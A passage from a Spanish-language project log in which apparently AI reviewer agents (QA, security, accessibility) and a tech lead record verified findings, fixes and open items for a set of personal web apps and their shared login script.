`build.sh` en local; la confirmación en vivo solo es posible después de fusionar. Vale la pena que el tech lead decida si esto se acepta como costo de la migración o si conviene configurar algo equivalente para Workers. Casos borde 12 (infra, con dos partes) y triaje completo de los 12 anteriores confirmados en código (no solo en la tabla) en `docs/hourglass/requerimientos.md`. Detalle completo en `docs/release-log.md` y `docs/infra-watch.md`.

- **2026-07-30 (tech lead, cierre de los 3 hallazgos de Hourglass — leer junto a las 3 entradas de abajo):** los tres hallazgos no bloqueantes que reportaron `security-reviewer`, `qa-lead` y `accessibility-reviewer` **se corrigieron antes del commit**, no quedaron como deuda: (1) `normalize()` descarta ahora los registros con más de `MAX_ENTRY_DAYS` (31) de duración y `segmentsOf()` tiene tope duro de `MAX_ENTRY_DAYS + 2` trozos — el tope en `segmentsOf()` es imprescindible además del filtro, porque **los cronómetros en curso no pasan por `normalize()`**: se convierten en registro virtual con `fin` = ahora (`trackerAsEntry`), así que un `startedAt` disparatado llegaría igual al bucle. Re-medido: el caso de los 14,58 s ahora resuelve por debajo de 100 ms. (2) El pop-up de cronómetro olvidado marca `inert` en los hermanos del `<body>` mientras está abierto y los libera al cerrar (`lockBehindModal`/`unlockBehindModal`), mismo patrón que `auth-gate.js`. (3) El `tabpanel` recuperó indicador de foco (`:focus-visible` con `outline`), en vez del `outline:none` que tenía. Queda **sin corregir a propósito** el hallazgo del doble clic de qa-lead: hoy no reproduce (el guardado es síncrono) y un guardia explícito sería código especulativo — anotado como caso borde pendiente, a revisar el día que el guardado pase a ser asíncrono. **Dato de proceso para el resto del equipo:** el fallo más caro de esta rama no lo encontró ningún agente sino la prueba en vivo del propio tech lead — un acento grave dentro de un comentario CSS de `auth-gate.js` cerró el template literal y **dejó a las 5 apps existentes sin candado de login**. `node --check` no está disponible en este equipo (no hay Node ni Python), así que la única red de seguridad real para ese archivo es cargarlo en el navegador y confirmar que el candado aparece. Hacerlo siempre que se toque `auth-gate.js`.

- **2026-07-30 (qa-lead, app nueva `hourglass.html`, rama `claude/hourglass-app`, servidor real `http://localhost:8791/`):** **APROBADO CON OBSERVACIONES.** Los 9 puntos que el tech lead dijo haber verificado se confirmaron con ejecución real en el navegador (datos inyectados en `state`, funciones globales invocadas directamente, eventos `dispatchEvent`/`.click()` reales — no lectura de código): sobrecarga por tiempo de reloj real vs. bruto (180 vs 240 min con 2 registros solapados 1h); registro que cruza medianoche se reparte 120/120 min entre los dos días calculando, sin tocar el dato guardado (confirmado también con Europe/Madrid, UTC+2, y con una zona horaria inválida que cae al offset del navegador sin romperse); dos cronómetros del mismo proyecto fusionan correctamente a tiempo de reloj (60 min) mientras suman en bruto (~91 min); el aviso de cronómetro olvidado es un modal centrado real (`position:fixed`, `inset:0`, `display:flex` centrado), no un banner; el rango personalizado se acota a un año con auto-ajuste; meta de horas con comparación plan-vs-real funcionando; filtros reales confirmados en Registros y Proyectos (con eventos de UI, no solo cambiando estado a mano); pausas descontadas del tiempo activo; **0 llamadas a `syncToCloud` en ~20 segundos reales de un cronómetro corriendo** (instrumenté la función). Las 5 apps + el hub siguen con el candado funcionando tras el cambio de archivos compartidos, sin errores de consola. Sin overlap medido entre la escena de login nueva y la tarjeta en 568×320/899/901/950/1024/1280px (0px en todos) — no repite el patrón de solape que sí tuvieron Gantt/Bitácora en revisiones anteriores. **Confirmo y elevo con medición real el hallazgo de `security-reviewer`** sobre `segmentsOf()` sin tope: una entry con fechas absurdas (`2026-01-01`→`9999-01-01`) genera 2.912.079 segmentos y bloquea el hilo principal **14.58 segundos reales** (medido con `performance.now()`), no solo "puede colgar" en teoría — como `renderPanel()` (vista por defecto) recorre todas las entries en cada render, una sola entry así congela la interfaz completa cada vez que se abre la app, con una vía de recuperación real (ir a Registros, que no recalcula, y borrar la entry) pero indistinguible de un cuelgue real la primera vez. Sigo de acuerdo con security-reviewer en que no bloquea este release (requiere manipular datos fuera de la UI normal), pero recomiendo cerrarlo pronto por ser una corrección barata frente a un costo de soporte alto para una usuaria sin ayuda inmediata. Hallazgo propio nuevo, no bloqueante: el doble/triple clic rápido en "Agregar registro"/"Iniciar cronómetro" no duplica hoy, pero por un efecto colateral del re-render (deja el formulario vacío) y no por un guardia explícito — frágil si el guardado pasa a ser async en el futuro. Detalle completo en `docs/hourglass/qa-checklist.md` y casos borde 10-12 en `docs/hourglass/requerimientos.md`.

- **2026-07-30 (accessibility-reviewer, app nueva `hourglass.html` + escena de login `hourglass-time`, rama `claude/hourglass-app`):** **APROBADO CON OBSERVACIONES.** Los 8 puntos del encargo se confirmaron correctos por lectura completa del código (labels, `role="tablist"/tab/tabpanel"` con navegación por flechas/Home/End, diálogo modal con trampa de foco y devolución de foco, región `aria-live`, color nunca como única señal, punto del chip respetando `prefers-reduced-motion`, escena oculta bajo 900px, meta viewport presente desde ya). Una precisión: la escena `hourglass-time` **no tiene su propio bloque `@media (prefers-reduced-motion: reduce)`** como decía el encargo — sus reglas viven dentro del bloque general ya compartido con `coins-rain`/`gantt-build` (`auth-gate.js:1197-1218`); el resultado es igual de correcto (nada invisible, valores fijados en estados intermedios reales de cada `@keyframes`), solo la descripción era imprecisa. **Dos hallazgos nuevos, no bloqueantes:** (1) el diálogo de "cronómetro olvidado" (`checkStaleTrackers`, `hourglass.html:1854-1909`) atrapa el Tab correctamente pero no marca `inert`/`aria-hidden` en `header`/`nav`/`main` — un lector de pantalla en modo de cursor virtual puede seguir "entrando" al contenido de fondo, a diferencia del candado de `auth-gate.js` que sí usa `inert` en sus hermanos; (2) el `tabpanel` (`tabindex="0"`) pierde el indicador de foco visible por `[role="tabpanel"]:focus{outline:none;}` sin sustituto (`hourglass.html:222`), una parada real del recorrido de Tab sin indicador (WCAG 2.4.7). **Limitación de herramienta severa esta sesión, relevante para cualquier agente que use este navegador después:** ningún clic/tecla/tipeo sintético tuvo efecto confirmable sobre el DOM de la app — probado con el caso más simple posible (clic sobre un `<a href>` sin JS, `hourglass.html:311`, no navegó en 3 intentos) — y `screenshot` falló siempre con "the Browser pane is not displayed, so the page is not compositing frames". No se pudo recorrer la app con teclado real ni emular `prefers-reduced-motion` (la herramienta de este navegador tampoco expone esa opción, solo `colorScheme`). Toda la verificación de teclado/foco de esta revisión es lectura de código, marcada explícitamente como no confirmada en vivo. Recomendado repetir el Tab real (tabla de Registros/Proyectos y filtros) en una sesión donde el panel sí componga. Detalle completo en `docs/hourglass/accessibility-notes.md` y casos borde 5-9 en `docs/hourglass/requerimientos.md`.

- **2026-07-30 (security-reviewer, app nueva `hourglass.html`, rama `claude/hourglass-app`):** **APROBADO CON OBSERVACIONES.** Sin hallazgos bloqueantes — cobertura de escapado (`esc()`) excepcionalmente completa para ser la primera auditoría de una app nueva (a diferencia del patrón histórico de este proyecto de encontrar gaps reales de XSS en 3 de 5 apps en su primera pasada), y aislamiento por `user_id` correcto desde el primer commit, incluyendo la ventana de carrera de `save()` ya corregida sin haber repetido el error que a las otras 4 apps les costó una ronda completa de hallazgos (`a4a2d10`). `auth-gate.js` queda sano tras agregar la escena de login `hourglass-time` (187 líneas, backticks en paridad par, `guard()`/`lockBackground`/`applyInert`/`onAuthStateChange` sin tocar, todo lo interpolado en la escena es numérico/hardcodeado, sin vía de contenido externo al shadow DOM). **Hallazgo real, no bloqueante, relevante para cualquier app del hub que calcule totales de tiempo/rango a partir de fechas de usuario:** `segmentsOf()` (`hourglass.html:580-592`) no tiene tope de iteraciones para la duración de una entry individual, a diferencia de `dayKeysInRange()` que sí lo tiene (`out.length < 400`) — un JSON con `inicio`/`fin` absurdamente separados (vía el puente de carpeta local editado a mano, o una fila de `app_data` corrupta) puede generar millones de segmentos en cada render del panel. No explotable por terceros (proyecto de un solo usuario), pero el vector se ampliaría si algún día se agrega un "importar backup" como el que ya tiene `bitacora-mentor.html`. **De paso, cierre de un pendiente documentado el 2026-07-28:** `--aiapps-chrome-bottom` ya tiene tope `min(...,40vh/40px)` tanto en el widget de Cuenta compartido (`auth-gate.js:2177`) como en el badge nuevo de Hourglass (`hourglass.html:95`) — no se identificó el commit exacto que lo cerró para las otras apps, pero el gap de robustez ya no existe en el código actual. Detalle completo con evidencia línea por línea en `docs/security-notes.md` ("Revisión 2026-07-30 — app nueva `hourglass.html`") y casos borde en `docs/hourglass/requerimientos.md` (nuevo archivo).

- **2026-07-29 (qa-lead, rama `claude/mentor-sesiones-editables-y-checklist`, commits `fa22eb9`/`964e833`/`9e6dc47` sobre `bitacora-mentor.html`, servidor real `http://localhost:8796/`):** **APROBADO CON OBSERVACIONES.** Confirmé con ejecución real (datos inyectados en `state`, `render()`/`renderModal()` reales, sin credenciales de prueba) los 7 puntos pedidos: editar una sesión individual vieja en formato legado y guardarla no pierde nada (compromisos, enfoques, checklist, plantilla); el ciclo guardar→recargar→releer (simulado con el `localStorage` real de la app + `migrarSesiones()`) coincide 100%; el checkbox de compromiso en la línea de tiempo persiste de inmediato; el contador de pendientes cuenta ÍTEMS no sesiones (confirmado "3 actividades pendientes" con 4 sesiones de prueba, 2 con ítems); el enfoque múltiple no deja apagar el último activo y las estadísticas suman cada marca (2/2/2 confirmado en Reportes); "editar" vs "continuar borrador" y el título del modal funcionan en las 4 combinaciones (individual/grupo × final/borrador). **Hallazgo nuevo, no cubierto por lo ya declarado como incompleto:** editar y guardar una sesión de GRUPO que ya tenga `commitments`/`approaches` con 2+ ítems borra silenciosamente todo excepto el primero de cada lista, sin ninguna advertencia en el modal — reproducido en vivo. No es alcanzable por el uso 100% orgánico de la app (crear/editar grupo nunca produce más de 1 ítem por lista), pero sí combinando "Importar copia" (acepta cualquier JSON con la forma mínima esperada) con la opción "editar" en sesiones de grupo ya finalizadas, expuesta por primera vez en esta misma rama. Detalle completo en `docs/bitacora-mentor/qa-checklist.md` y caso borde 16 en `docs/bitacora-mentor/requerimientos.md`. Como el diff de estos 3 commits toca únicamente `bitacora-mentor.html` (confirmado con `git diff --stat`), no repetí la verificación de login de las otras 4 apps.

- **2026-07-28 (qa-lead, reverificación de las correcciones del RECHAZADO, commit `228043a`, servidor real `http://localhost:8796/`):** **Se levanta el RECHAZADO — APROBADO CON OBSERVACIONES.** Los tres hallazgos que motivaron el rechazo quedan confirmados como cerrados con medición real en vivo, no lectura de código: (1) **bug de `oSym` en LP-Bag cerrado** — con datos inyectados reales (`appData.expenses`), la columna original y la convertida usan el mismo estándar (`US$`/`RD$`) en desktop y 375px, con moneda destino DOP y USD, en tabla y tarjetas móviles; barrido de regex sobre el DOM completo (no solo las 2 líneas del diff) da 0 coincidencias de `$` ambiguo. (2) **solape del login de Gantt cerrado** — barrido real con `getBoundingClientRect` en 11 anchos (320 a 1920px), con foco en los dos puntos que antes fallaban exactamente (585px y 568×320 landscape): overlap=0px en los 11. Usé una fórmula de intersección de rects corregida (`min(rights)-max(lefts)`, clamped a 0) porque la fórmula ingenua `sceneRight-cardLeft` da falsos positivos cuando la escena tiene ancho 0 (no es solape visual real). Anchos grandes (1920px) conservan el ancho amplio de antes (1190px), sin regresión. (3) **contraste del badge de Bitácora cerrado para el texto** (4.88:1, coincide exacto con lo que reclama el commit) — pero **discrepancia nueva, no bloqueante:** el commit afirma que el borde (mismo `--rust` sobre `--rust-light`, sin cambios) da "4.0:1"; medido en vivo da **4.44:1** (el mismo valor que ya había medido `accessibility-reviewer` para el texto viejo, porque es literalmente el mismo par de colores). Sigue aprobando el 3:1 exigido para bordes, así que no bloquea, pero es una cifra que no coincide con lo que el tech lead dice haber verificado — se reporta la discrepancia en sí, como pide el protocolo de este rol. (4) **Clamp de `--aiapps-chrome-bottom` (hallazgo de `security-reviewer`, commit `9383356`) confirmado sin mover nada bajo condiciones normales:** en MyTravel a 375px, la holgura badge/nav sigue siendo exactamente 13px (idéntica a la medida anteriormente); forzando la variable a 5000px, el widget se queda en pantalla (antes se habría ido fuera) — el clamp funciona y no rompió el caso normal. **Regresión en app no tocada:** StaffGate (no forma parte del diff de esta ronda) recargada con el `auth-gate.js` ya corregido — overlay de login, formulario con tecleo real, insignia de carpeta en su posición esperada, 0 errores de consola. **Sin regresiones nuevas encontradas en ninguna de las tres correcciones.** Detalle completo en `docs/lpbag/qa-checklist.md`, `docs/gantt/qa-checklist.md`, `docs/bitacora-mentor/qa-checklist.md` y `docs/staffgate/qa-checklist.md`.

- **2026-07-28 (qa-lead, revisión completa de `claude/widget-cuenta-y-botones-mentor` en vivo, servidor real `http://localhost:8796/`, las 5 apps + hub):** **APROBADO CON OBSERVACIONES, con un bloqueante puntual** (ver "⚠️ Requiere atención" arriba: bug de moneda de LP-Bag). Resumen de lo confirmado con ejecución real (no lectura de código): (1) widget de Cuenta reposicionado sin overlap medido en las 5 apps, desktop y 375px (clon del CSS literal usado para medir geometría, ya que no hay credenciales de prueba para montar el widget real); (2) MyTravel — la holgura de 13px entre insignia de carpeta y barra de navegación móvil que el tech lead afirmó, confirmada EXACTA; (3) botones lila de Bitácora confirmados con `getComputedStyle` real; (4) **el ensanchado del login de Gantt NO solapa en los 5 anchos pedidos (960-1920px) pero SÍ solapa en un rango no pedido (~500-589px) y en una dimensión de móvil real en horizontal (568×320)** — mejora sobre la fórmula vieja pero no cumple "sin solape en ningún ancho" de forma literal, ver caso borde 19 en `docs/gantt/requerimientos.md`; (5) los dos logos animados nuevos (lector de Bitácora, dardo de StaffGate) SÍ animan de verdad, confirmado moviendo `currentTime` sobre `getAnimations()` real, no solo la existencia de la regla CSS; (6) nubes/avión de MyTravel confirmados con las cifras exactas pedidas (rango 28-48px, ratio 1.7x); (7) eliminación de la sección de seguridad de LP-Bag confirmada limpia (coincide con la revisión independiente de security-reviewer el mismo día); (8) sample data + generación de barras de Gantt confirmada funcionando end-to-end (16 filas → 16 `.gantt-bar` con `border-radius:999px` y colores pastel reales); (9) 0 errores de consola en las 6 páginas durante toda la sesión. **Hallazgo bloqueante nuevo, no compartido por ningún otro agente:** el cambio de moneda de LP-Bag deja `$` ambiguo en la columna de monto original (`oSym`), ver arriba. **Discrepancia de proceso:** el encargo describía 10 cambios pero el diff trae un 11º ("Bitácora pendientes") no mencionado — funciona bien, pero se señala la discrepancia en sí como corresponde. Detalle completo por app en `docs/{lpbag,gantt,bitacora-mentor,staffgate,mytravel,hub}/qa-checklist.md`.

- **2026-07-25 (security-reviewer, PR #21 → `master`: `_headers`, `supabase-keepalive.yml`, `build.sh`, reduced-motion en `auth-gate.js`):** **APROBADO CON OBSERVACIONES**, sin bloqueantes. Lo más importante para el resto del equipo: `build.sh` ejecutado en este entorno confirma que `dist/` queda con exactamente 10 archivos (6 HTML + 3 JS + `_headers`) y **0** archivos de `docs/`/`release-notes/` — cierra de verdad la exposición pública que tenía Netlify hoy. El `inert` del candado (revisado de nuevo aunque no estaba en el diff) sigue sin caminos de fail-open ni de quedar puesto permanentemente. La llave `anon` hardcodeada en el nuevo workflow es la misma que ya viaja en `supabase-client.js` (confirmado decodificando el JWT: mismo string, `role:anon`) — sin exposición nueva. Hallazgo con valor accionable, no bloqueante: el workflow `supabase-keepalive.yml` solo mira el código HTTP (200/206/401/403 = "bien") y no el cuerpo de la respuesta — una tabla con RLS **desactivado** también respondería 200, con filas reales, y el script lo reportaría igual como "todo bien". Agregar una verificación de que el cuerpo sea `[]` convertiría esta tarea en un centinela automático del mayor punto ciego del proyecto (RLS no verificable desde el dashboard). Detalle completo, con evidencia línea por línea, en `docs/security-notes.md` ("Revisión 2026-07-25 — PR #21").


- **2026-07-24 (accessibility-reviewer):** confirmado y dimensionado (no solo sospechado) que `auth-gate.js` no tiene ningún bloque `@media (prefers-reduced-motion: reduce)` — 0 coincidencias en todo el archivo, y probado en vivo con `page.emulateMedia({reducedMotion:'reduce'})`: `matchMedia` reporta `true` pero las animaciones (`coin-fall`, `sparkle-flash`, etc.) siguen corriendo sin cambios. Afecta a las 5 escenas del archivo (`coins-rain`, `gantt-build`, `travel-sky`, growth-scene, interview), no solo a la de LP-Bag. Incluyo en mi archivo una propuesta concreta de bloque `prefers-reduced-motion` que cubre las 5 escenas (no aplicada — decisión de alcance pendiente con la usuaria) y un caso borde importante: aplicarlo de forma ingenua (`animation:none` parejo) dejaría invisibles varios elementos de `gantt-build` porque su estado de reposo es `opacity:0`/`width:0`. También confirmé varios textos de la tarjeta de login bajo el umbral de contraste WCAG AA (ej. el enlace "¿Olvidaste tu contraseña?" a 2.55:1, el texto del botón "Entrar" a 3.23:1) — preexistentes, no introducidos por el PR #18. Cualquier agente que toque estilos de la tarjeta de login o proponga el bloque reduced-motion debería partir de `docs/lpbag/accessibility-notes.md` en vez de rehacer el inventario. Los dos hallazgos de teclado más severos (overlay sin trampa de foco, enlace de recuperación inalcanzable) están en "⚠️ Requiere atención" arriba.

- **2026-07-23 (qa-lead, revisando fixes de StaffGate y MyTravel en `custom-login-scenes-per-app`):** en `mytravel-pro-v4.html` sobre `file://`, `read_page`/`get_page_text` devolvió el dashboard ya cargado (estado de sesión activa) mientras que una captura de pantalla real tomada en el mismo instante mostraba la pantalla de login normal (candado real activo, con la escena decorativa correcta). Es decir, la herramienta de accesibilidad/texto puede devolver un snapshot desincronizado del DOM visual real en esta sesión — no confiar solo en `read_page`/`get_page_text` para confirmar qué pantalla está realmente activa; siempre cruzar con una captura de pantalla real antes de concluir "el candado no aparece" o similar. Esto complementa (no contradice) la limitación de herramienta ya documentada arriba. Detalle en `docs/mytravel/qa-checklist.md` y `docs/staffgate/qa-checklist.md`.

- **2026-07-24 (tech lead):** pendiente de menor prioridad anotado por `security-reviewer`: el patrón `scopedKey`/`cachedUserId`/`isSyncKey` quedó duplicado línea por línea en las 5 apps en vez de vivir en `supabase-client-app.js`. Funciona correctamente tal como está, pero si se agregan más apps al hub en el futuro, extraerlo a un archivo compartido evitaría que cada una tenga que copiarlo a mano (y evitaría que alguna quede con una versión desactualizada del patrón, como pasó brevemente con la ventana de carrera de abajo). No es urgente.

- **2026-07-24 (qa-lead):** Aviso de alcance (sin acción pendiente, solo higiene de proceso): al revisar contra los archivos reales en disco en vez de contra un rango de commits nombrado, se descubrieron 2 commits posteriores (`a4a2d10`, `9486dfc`) que ya resolvían algo que el agente estaba a punto de reportar de forma independiente. Lección para el equipo: confirmar siempre contra el HEAD real, no solo contra el rango de commits que se nombró en el encargo.

- **2026-07-24 (qa-lead, revisando commit `7e6dac5` en `hub-header-apps-label-lp-logo`, barras escalonadas + logo animado del login de Gantt):** dos hallazgos que contradicen lo que se esperaba, ambos con evidencia medida en vivo (`getComputedStyle`/`getBoundingClientRect`, no lectura de código): (1) el logo animado del login usa **3 colores** (lila, amarillo, y un púrpura `#8C6BC8` en la tercera barra) cuando la usuaria pidió explícitamente solo "lila y amarillo" para el logo — la petición de 3 colores era para las barras del fondo, no para el logo; (2) en viewport móvil (375px) la escena decorativa del fondo (incluidas las nuevas barras escalonadas) queda **100% tapada** detrás de la tarjeta de login opaca (`background` sólido, sin `backdrop-filter`, `z-index:4`) — confirmado que no hay superposición en desktop (1280px) pero sí total en 375px. El punto 2 no es una regresión de este commit (el posicionamiento no cambió), pero anula visualmente el trabajo en teléfono y el mismo layout (`AIAPPS_LOGIN_LAYOUT='right'`) lo comparte Bitácora del Mentor, así que vale la pena que quien revise esa app lo tenga en cuenta. Lo demás sí coincidió con lo que dijo el tech lead: la interpretación de "escalada" (ancho creciente, todas desde el borde izquierdo) es la correcta, `c-brass`/`c-teal` de verdad no se usan en ningún otro lado, `AIAPPS_LOGO_BARS` de verdad solo se activa en Gantt, StaffGate y Bitácora cargaron sin errores con la versión nueva de `auth-gate.js`, y la animación del logo cambia realmente con el tiempo (verificado forzando `currentTime` sobre `getAnimations()`, no solo confirmando que la regla CSS existe). Detalle completo en `docs/gantt/qa-checklist.md` y casos borde 13/14 en `docs/gantt/requerimientos.md`.

- **2026-07-24 (accessibility-reviewer, revisando commit `7e6dac5` de Gantt):** confirmado por conteo directo sobre `auth-gate.js` en el commit revisado: de **todas** las animaciones `infinite` que arrancan solas en las escenas de login (`gantt-grow`/`dot-move`/`flag-show`/`date-fall`, `coin-pop`, `coin-fall`, `sparkle-flash`, `cloud-drift-back`/`screen`, `fly-1`…`fly-6`, `milestone-light`, `flag-cycle`/`flag-flutter`, `hop-move`/`hop-squash`, `interview-bounce`, `deco-float` — es decir, las 5 apps), la **única** que respeta `prefers-reduced-motion` es la que este mismo commit acaba de agregar (`.logo-bars`, propia de Gantt). No es una regresión de este commit — es la primera vez que *algo* en este archivo respeta esa preferencia — pero confirma que es deuda real y transversal, no solo una sospecha. Recomendación concreta de cómo cerrarlo con una sola edición compartida (y una advertencia importante: varias animaciones terminan en `opacity:0`/`width:0%` en su `100%`, así que un interruptor genérico de "1 iteración, congelar al final" dejaría esas escenas *vacías*, no "congeladas a medio camino" — hay que revisar caso por caso antes de aplicarlo) en `docs/gantt/accessibility-notes.md`. También encontrado y no listado en el encargo original: la tarjeta de login (`.card`, las 5 apps) tiene un efecto de inclinación 3D que sigue el mouse en tiempo real (`mousemove` sobre `.cover`), otra fuente de movimiento continuo fuera de los `@keyframes` nombrados.

- **2026-07-24 (security-reviewer, rama `mytravel-login-paisaje`):** revisión del rediseño cosmético del fondo de login de MyTravel (`auth-gate.js`, escena `travel-sky` reescrita con edificios/bosque/aviones/nubes generados por datos + logo con avión flotante) — **APROBADO**, sin hallazgos nuevos. Confirmado que el diff no toca `guard()`/`removeExistingOverlay()`/`onAuthStateChange` en `auth-gate.js`, sin nuevos `<script src>`/`<link>`, sin secretos, sin nueva superficie de interpolación de input externo (todo lo interpolado es literal hardcodeado o `Math.random()`; `AIAPPS_APP_EMOJI` sigue siendo el mismo riesgo aceptado 2026-07-21, sin cambio de perfil). Detalle en `docs/security-notes.md` ("Revisión 2026-07-24 — rama `mytravel-login-paisaje`").

- **2026-07-24 (qa-lead, revisando el cambio STAGED en `hub-header-apps-label-lp-logo` — cordillera + secuencia del muñequito en el login de Bitácora del Mentor, escena `mentor-people`):** dos hallazgos importantes para el resto del equipo, ambos con evidencia medida en vivo (no lectura de código):
  1. **`bitacora-mentor.html` es la única de las 5 apps + hub sin `<meta name="viewport">`** (confirmado por grep en las 6 HTML del proyecto). Consecuencia real medida: bajo emulación móvil real (375×812), `window.innerWidth` de la página reporta **981px**, no 375 — confirmado además que el mismo preset móvil sí da 375 en StaffGate.html (que sí tiene el meta tag), descartando que fuera un artefacto de la herramienta. Esto significa que el nuevo `@media (max-width:900px){ .growth-scene{display:none} }` que este cambio agrega **nunca se activa en un teléfono real** (981>900), y la escena decorativa efectivamente se solapa con la tarjeta de login (47px de solape medido con `getBoundingClientRect` a ese ancho efectivo). El fix del tech lead para "pantallas angostas" queda anulado en la práctica por este bug preexistente, no tocado por este diff. Relevante para accessibility-reviewer/business-analyst también.
  2. **El mismo problema de solape existe también en desktop/tablet real, sin depender del bug de viewport meta:** entre ~901px y ~1140px de ancho de viewport (fuera del corte de 900px, con o sin el bug anterior), la escena y la tarjeta se solapan de verdad — confirmado con rects en 901px (80px de solape), 950px (64px), 1024px (47px, con el `.hop-figure` y una de las 3 chispas del fuego artificial cayendo literalmente dentro del rectángulo de la tarjeta en el momento del clímax) y 1100px (14px); deja de solaparse recién en ~1150px. Ese rango cubre anchos de laptop/tablet muy comunes (1024, 1080, 1100). Mismo patrón que el hallazgo de Gantt del 2026-07-24 sobre el layout `AIAPPS_LOGIN_LAYOUT='right'` compartido — ya se había anticipado ahí que Bitácora lo heredaría, y se confirma.

  Detalle completo, con el resto de la verificación (secuencia de 30s contra keyframes, reduced-motion, node-count, escenas de las otras 4 apps intactas) en `docs/bitacora-mentor/qa-checklist.md` y casos borde en `docs/bitacora-mentor/requerimientos.md`.

- **2026-07-24 (qa-lead, nota de proceso — riesgo de concurrencia ya documentado arriba, ocurrió de nuevo):** durante esta misma revisión, el estado STAGED de `auth-gate.js` que se me pidió revisar dejó de estar staged a mitad de la tarea (otra sesión concurrente commiteó al mismo branch: `d8876d2`, `5a26f1b`, `3029526`, ninguno relacionado con Bitácora). Verifiqué con `diff` que el bloque de código de la escena `mentor-people` seguía siendo **byte-idéntico** al que había capturado del índice al inicio, así que la revisión funcional es válida — pero lo señalo porque, si el contenido hubiera cambiado a mitad de camino, el veredicto habría quedado basado en código que ya no era el que se pidió revisar. Además aparecieron archivos temporales de otras sesiones activas en paralelo (`_a11yX-*`, `_qaX-*`) mientras yo trabajaba — confirma que sigue habiendo múltiples hilos escribiendo la misma carpeta sin worktrees.

- **2026-07-24 (security-reviewer, commit `ba88936` en `hub-header-apps-label-lp-logo`):** revisión del reparto de iconos decorativos del login de StaffGate (`scatterCells()` nueva en `auth-gate.js`) + zoom automático (`setInterval` de 2s + clase `.auto-focus`) — **APROBADO**, sin bloqueantes. Confirmado que `removeExistingOverlay()` cancela los timers guardados (`_aiappsTimers`) antes de destruir el overlay, incluso en el único camino real donde se reconstruye sin recarga completa de página (`PASSWORD_RECOVERY` → `buildSetNewPasswordOverlay()`); sin nueva superficie de XSS explotable (el único camino con input externo, `AIAPPS_LOGIN_DECORATIONS`, sigue sin ser usado por ninguna de las 5 apps); sin clickjacking sobre "Entrar" porque `.card` tiene `z-index:4` explícito y los iconos decorativos no. Dos observaciones de bajo riesgo, no bloqueantes, quedaron como casos borde 13 y 14 en `docs/staffgate/requerimientos.md`. Detalle completo en `docs/security-notes.md` ("Revisión 2026-07-24 — commit `ba88936`").

- **2026-07-24 (accessibility-reviewer, commit `ba88936` en `hub-header-apps-label-lp-logo`, reparto de iconos + zoom automático del login de StaffGate):** **APROBADO CON OBSERVACIONES**, sin bloqueantes nuevos. Lo que el tech lead afirmó haber hecho es cierto pero incompleto: el `setInterval` del zoom automático (`.auto-focus`, cada 2s) sí tiene un gate real de `prefers-reduced-motion` (`auth-gate.js:935-936`, confirmado por lectura del código extraído del commit) que impide que arranque si la preferencia ya está activada al construir el overlay — **pero es una lectura de una sola vez, sin `matchMedia(...).addEventListener("change", ...)` en todo el archivo**, así que si la persona cambia esa preferencia del sistema con el login ya abierto, el zoom que ya está corriendo no se detiene. Confirmado en vivo con el ciclo completo de Tab (Correo→Contraseña→Entrar) que los 36 iconos repartidos no entran al orden de tabulación y no interfieren con el foco del formulario. Reconfirmado de forma independiente (no solo lectura de código, sino con el ciclo de Tab real) que "¿Olvidaste tu contraseña?" sigue sin ser alcanzable por teclado en StaffGate — mismo hallazgo transversal ya reportado el 2026-07-24 sobre Gantt, arriba en esta sección. Hallazgo menor no reportado antes: los SVG de `.interview-icon`/`.deco` no tienen `aria-hidden="true"`, a diferencia de otros dos SVG decorativos en el mismo archivo que sí lo tienen. Detalle completo en `docs/staffgate/accessibility-notes.md` y casos borde 15-18 en `docs/staffgate/requerimientos.md`.

- **2026-07-24 (tech lead, cerrando los hallazgos de accessibility-reviewer sobre `ba88936`):** los dos hallazgos accionables quedaron **corregidos en `d15e05c`** (ya pusheado). (1) El gate de `prefers-reduced-motion` del zoom automático ahora es reactivo: `matchMedia(...).addEventListener("change", ...)` cancela el `setInterval` y limpia la clase `.auto-focus` de todos los iconos si la preferencia se activa con el login abierto, y lo vuelve a arrancar si se apaga; el listener se desregistra al destruir el overlay vía un nuevo `host._aiappsCleanups` (mismo patrón que `_aiappsTimers`). Verificado en vivo sustituyendo `window.matchMedia` por una media query controlada: preferencia apagada → 2 iconos con zoom y 1 timer; al activarla → 0 y 0 en el momento, y sigue en 0 tras 2.6s; al desactivarla → 2 y 1 otra vez; un solo listener registrado. (2) `aria-hidden="true"` agregado en `.interview-icon` y `.deco` (36/36 confirmados en el DOM). **Nota para quien retome esto:** `host._aiappsCleanups` es un gancho genérico y vacío por defecto — si otra escena de login agrega listeners globales (`resize`, `matchMedia`, `visibilitychange`), registrar ahí su limpieza en vez de dejarla colgando. Los hallazgos 2, 3 y 5 (deuda transversal de reduced-motion en `interview-bounce`/`deco-float` y las demás escenas, WCAG 2.2.2, contraste decorativo) siguen **abiertos**, y el de "¿Olvidaste tu contraseña?" inalcanzable por teclado necesita su propio PR — no se tocó aquí.

- **2026-07-24 (tech lead, nota de proceso — qa-lead NO alcanzó a revisar `ba88936`/`d15e05c`):** el agente `qa-lead` lanzado sobre el commit de StaffGate **murió a mitad de tarea por límite de sesión de la cuenta** (se restablece 11:20pm), justo antes de escribir sus hallazgos en los docs. O sea: el cambio de los iconos del login de StaffGate tiene APROBADO de seguridad y APROBADO CON OBSERVACIONES de accesibilidad, pero **no tiene veredicto de QA**. Según la regla principal de `CLAUDE.md`, no se fusiona a `master` hasta que `qa-lead` corra. Lo que quedó sin verificar y hay que retomar: si algún icono se monta o roza la tarjeta de login en pantallas angostas (móvil 375px, donde la tarjeta ocupa casi todo el ancho y la exclusión de `scatterCells()` es por porcentaje), si `scatterCells()` puede devolver dos posiciones idénticas, y el camino `count` = 0/1 de `AIAPPS_LOGIN_DECORATIONS` (`decoCells[i]` podría quedar `undefined`).

- **2026-07-24 (tech lead, rama `mytravel-login-paisaje`) — revisión INCOMPLETA, pendiente:** el PR del paisaje de login de MyTravel se abrió con solo 1 de los 3 veredictos requeridos. `security-reviewer` dio APROBADO; `qa-lead` se cortó a media revisión por límite de sesión de la API (alcanzó a confirmar que StaffGate carga bien, nada más) y `accessibility-reviewer` se detuvo manualmente. Falta correr ambos contra la rama antes de fusionar a `master`. El tech lead verificó por su cuenta (DOM y geometría medidos en vivo, NO por captura de pantalla — el panel de navegador de esa sesión dejó de componer frames y toda captura falló): el avión del logo solo se mueve en vertical, el bosque asoma por encima de los edificios bajos, 3 torres rebasan la cima más alta, y las otras 4 apps cargan con ese `auth-gate.js` con su propia escena y sin errores de consola. Nadie ha visto el resultado con los ojos todavía.
